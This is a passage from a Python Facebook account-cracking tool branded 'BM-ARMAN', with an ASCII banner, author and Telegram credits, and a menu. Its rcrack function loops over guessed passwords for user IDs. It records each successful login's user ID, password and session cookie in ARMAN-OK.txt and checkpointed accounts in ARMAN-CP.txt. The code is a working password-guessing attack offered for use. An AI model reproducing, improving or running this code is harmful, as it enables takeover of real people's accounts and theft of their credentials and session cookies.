...
| $$       /$$__  $$| $$  | $$| $$  | $$| $$ | $$ | $$ /$$__  $$| $$  | $$| $$
| $$$$$$$$|  $$$$$$$|  $$$$$$$| $$  | $$| $$ | $$ | $$|  $$$$$$$| $$  | $$| $$
|________/ \_______/ \____  $$|__/  |__/|__/ |__/ |__/ \_______/|__/  |__/|__/
                     /$$  \ $$                                                
                    |  $$$$$$/                                                
                     \______/                                                 
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m Laghmani & \033[1;36mBARIE
╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m Laghmani & \033[1;33mBARIE
╠══[\033[1;35m[•] TEAM \033[1;34m    :\033[1;33m BM-ARMAN TEACH
╠══[\033[1;34m[•] TELEGRAM \033[1;32m:\033[1;34m t.me/ARMANtech12
...
def riaz():
	...
	if riaz1 =='0':
		exit()
	if riaz1 =='3':
		os.system('xdg-open https://t.me/ARMANtech12')
	if riaz1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mBM-ARMAN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ARMAN-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
                open('ARMAN-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[ARMAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('ARMAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
